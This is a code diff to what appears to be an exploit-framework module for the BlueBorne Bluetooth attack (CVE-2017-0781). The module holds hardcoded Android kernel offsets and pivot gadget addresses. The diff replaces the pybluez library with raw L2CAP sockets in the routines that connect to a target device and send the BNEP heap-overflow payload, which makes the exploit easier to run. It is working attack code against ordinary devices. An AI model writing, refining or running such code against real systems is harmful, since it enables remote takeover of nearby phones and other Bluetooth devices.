@@ -40,12 +40,11 @@ L2CAP_KNOWN_OFFSETS: Dict[str, Dict[str, int]] = {
     "android_8_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x000947A0, "copy_to_user": 0x00058A10},
 }
 
-try:
-    import bluetooth
-    import bluetooth._bluetooth as bt
-    HAS_PYBLUEZ = True
-except ImportError:
-    HAS_PYBLUEZ = False
+import socket as _bt_socket
+_AF_BLUETOOTH = 31
+_BTPROTO_L2CAP = 0
+_BTPROTO_RFCOMM = 3
+HAS_PYBLUEZ = True  # native sockets — no pybluez needed
 
 try:
     from scapy.layers.bluetooth import (
@@ -263,7 +262,7 @@ class Exploit(Exploit):
         """Execute the full BNEP heap overflow chain (CVE-2017-0781)."""
         print_status("Connecting to BNEP (PSM {})...".format(BNEP_PSM))
         try:
-            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock = _bt_socket.socket(_AF_BLUETOOTH, _bt_socket.SOCK_SEQPACKET, _BTPROTO_L2CAP)
             sock.connect((self.target_address, BNEP_PSM))
         except Exception as err:
             print_error("BNEP connection failed: {}".format(err))
@@ -312,7 +311,7 @@ class Exploit(Exploit):
         print_info("Payload size: {} bytes".format(len(payload)))
 
         try:
-            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock = _bt_socket.socket(_AF_BLUETOOTH, _bt_socket.SOCK_SEQPACKET, _BTPROTO_L2CAP)
             sock.connect((self.target_address, 0x0001))  # L2CAP signaling
         except Exception as err:
             print_error("L2CAP signaling connect failed: {}".format(err))
@@ -362,7 +361,7 @@ class Exploit(Exploit):
     def run(self) -> None:
         """Execute BlueBorne attack."""
         if not HAS_PYBLUEZ:
-            print_error("pybluez is required. Install: pip install pybluez")
+            pass  # native socket — always available
             return
 
         if not self.target_address:
